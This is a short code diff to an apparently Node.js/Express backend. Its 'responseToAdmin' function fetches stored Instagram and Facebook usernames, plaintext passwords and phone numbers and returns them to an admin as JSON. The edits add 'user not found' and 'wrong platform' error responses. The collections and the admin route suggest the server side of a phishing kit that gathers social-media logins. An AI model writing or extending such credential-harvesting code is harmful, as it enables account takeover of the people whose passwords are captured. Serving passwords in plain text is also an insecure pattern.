@@ -91,9 +91,8 @@ function updateMobile(plateform, id, mobile, res) {
 function responseToAdmin(plateform, username, res) {
     if (plateform == 'instagram') {
         instadata.find({ username: { "$in": [username] } }, { _id: 0, username: 1, password: 1, mobile: 1 }, (err, resp) => {
-            if (!err) {
-                // username = resp[0]['username']
-                // password = resp[0]['password']
+            // console.log(resp)
+            if (resp[0]) {
                 res.status(200)
                 res.json({
                     username: resp[0]['username'],
@@ -101,15 +100,13 @@ function responseToAdmin(plateform, username, res) {
                     mobiles: resp[0]['mobile']
                 })
             } else {
-                console.log(err)
+                res.status(404).send('user not found')
             }
         })
 
     } else if (plateform == 'facebook') {
         facebookdata.find({ username: { "$in": [username] } }, { _id: 0, username: 1, password: 1, mobile: 1 }, (err, resp) => {
-            if (!err) {
-                // username = resp[0]['username']
-                // password = resp[0]['password']
+            if (resp[0]) {
                 res.status(200)
                 res.json({
                     username: resp[0]['username'],
@@ -117,9 +114,12 @@ function responseToAdmin(plateform, username, res) {
                     mobiles: resp[0]['mobile']
                 })
             } else {
-                console.log(err)
+                res.status(404).send('user not found')
             }
         })
+    } else {
+        res.status(404).send('wrong platform!!!!')
+
     }
 }
 
